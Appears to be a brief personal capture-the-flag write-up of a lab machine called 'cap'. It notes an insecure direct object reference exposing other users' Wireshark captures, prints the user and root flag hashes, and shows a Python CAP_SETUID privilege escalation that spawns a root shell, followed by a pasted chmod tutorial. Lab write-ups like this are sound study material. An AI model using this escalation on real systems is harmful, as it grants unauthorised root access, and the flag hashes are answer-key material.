Insecure direct object reference
The program lets you download wireshark data, using which you can get information.

we see we can look at various traffic data from wireshark and download other people data at /0
```
nathan@cap:~$ cat user.txt
7d00a3541457383761f76e004e44b382
nathan@cap:~$ 
```

```
>>> import os
>>> os.setuid(0)
>>> os.systme("/bin/bash")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: module 'os' has no attribute 'systme'
>>> os.system("/bin/bash")
```

```
root@cap:/root# cat root.txt
a0d06b5eeed1b0ce0fe06a5b05a0756a
```

CAP_SETUID allows the process to gain setuid privileges without the SUID bit set. This
effectively lets us switch to UID 0 i.e. root.

### discussion about the symbolic method

```
Symbolic method

The symbolic method uses the following syntax:

[tcarrigan@server ~]$ chmod WhoWhatWhich file | directory

Where:

    Who - represents identities: u,g,o,a (user, group, other, all)
    What - represents actions: +, -, = (add, remove, set exact)
    Which - represents access levels: r, w, x (read, write, execute)

An example of this is if I want to add the read and write permissions to a file named test.txt for user and group, I use the following command:

[tcarrigan@server ~]$ chmod ug+rw test.txt
```

```
umeric method

The numeric method is, in my experience, the best way to learn and practice permissions. It is based on the following syntax:

[tcarrigan@server ~]$ chmod ### file | directory

Here, from left to right, the character # represents an access level. There are three access levels—user, group, and others. To determine what each digit is, we use the following:

    Start at 0
    If the read permission should be set, add 4
    If the write permission should be set, add 2
    If the execute permission should be set, add 1

This is calculated on a per access level basis. Let's interpret this permissions example:

-rw-r-x---

The permissions are represented as 650. How did I arrive at those numbers?

    The user's permissions are: rw- or 4+2=6
    The group's permissions are: r-x or 4+1=5
    The others's permissions are: --- or 0

To put this into the command syntax, it looks like this:

[tcarrigan@server ~]$ chmod 650 test.txt
```